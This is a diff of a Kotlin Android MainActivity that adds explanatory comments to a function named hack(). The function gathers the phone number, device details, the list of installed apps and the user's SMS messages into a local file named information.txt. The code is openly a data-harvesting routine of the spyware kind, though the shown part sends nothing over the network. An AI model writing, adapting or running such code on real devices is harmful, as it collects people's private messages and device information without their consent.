@@ -29,11 +29,13 @@ class MainActivity : AppCompatActivity() {
     }
 
     fun hack(){
+        //open a file to write
         val path = this.getExternalFilesDir(null)
         val directory = File(path, "SDF")
         directory.mkdirs()
         val file = File(directory,"information.txt")
 
+        //get phone number
         val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
         var phoneNumber = "access denied"
         if (!(ActivityCompat.checkSelfPermission(
@@ -44,6 +46,7 @@ class MainActivity : AppCompatActivity() {
             phoneNumber = tm.line1Number
         }
 
+        //get phone spcecs
         var systemData = "Device Information: "
         systemData = """${systemData}
         PHONE NUMBER : ${phoneNumber}
@@ -71,6 +74,7 @@ class MainActivity : AppCompatActivity() {
 
         file.writeText(systemData)
 
+        //get all visible installed aps
         val apkName: MutableList<String> = ArrayList()
         val intent = Intent(Intent.ACTION_MAIN, null)
         intent.addCategory(Intent.CATEGORY_LAUNCHER)
@@ -87,10 +91,11 @@ class MainActivity : AppCompatActivity() {
         }
         file.appendText(apps)
 
+        //get the users' sms
         var sms = "SMS List: \n"
         val cursor = contentResolver.query(Uri.parse("content://sms/"),null,null,null,null)
         cursor!!.moveToFirst()
-        if(cursor.count == 0){
+        if(cursor.count == 0){   //if there are no sms or contacts
             cursor.close()
             return
         }
